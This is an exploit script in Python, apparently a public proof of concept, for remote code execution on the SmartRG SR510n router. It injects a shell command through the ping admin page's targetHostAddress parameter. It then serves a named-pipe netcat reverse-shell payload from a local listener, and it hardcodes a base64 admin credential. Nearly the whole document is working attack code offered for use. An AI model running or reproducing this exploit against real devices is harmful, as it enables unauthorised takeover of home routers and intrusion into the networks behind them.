# Exploit Title: SmartRG Router SR510n 2.6.13 - RCE (Remote Code Execution)
# done by Sathwik.R - www.github.com/cicada0007

from subprocess import PIPE, Popen

import requests

router_host = "http://192.168.1.1"
authorization_header = "YWRtaW46QWRtMW5ATDFtMyM="

lhost = "lo"
lport = 80

payload_port = 81

LOCAL_HOST = lhost
LOCAL_PORT = lport
PAYLOAD_PORT = payload_port
config = {
    "router_host": router_host,
    "authorization_header": f"Basic {authorization_header}",
}


def main():
    try:
        payload_command = f"rm /tmp/s && mknod /tmp/s p && /bin/sh 0< /tmp/s | nc {LOCAL_HOST} {LOCAL_PORT} > /tmp/s"
        with Popen(["echo", payload_command], stdout=PIPE) as e_proc:
            Popen(["nc", "-nlvp", f"{PAYLOAD_PORT}"], stdin=e_proc.stdout)
            send_payload(f"|nc {LOCAL_HOST} {PAYLOAD_PORT}|sh")
            print("done.. check shell")
    except Exception as e:  # noqa: BLE001
        print(f"An error occurred: {e}")



def get_session():
    url = f"{config['router_host']}/admin/ping.html"
    headers = {"Authorization": config['authorization_header']}
    response = requests.get(url, headers=headers)
    session_key = response.text.split("&sessionKey=")[1].split("'")[0]
    return session_key



def send_payload(payload):
    print(payload)
    url = router_host + "/admin/pingHost.cmd"
    headers = {"Authorization": f"Basic {authorization_header}"}
    params = {"action": "add", "targetHostAddress": payload, "sessionKey": get_session()}
    requests.get(url, headers=headers, params=params)


main()
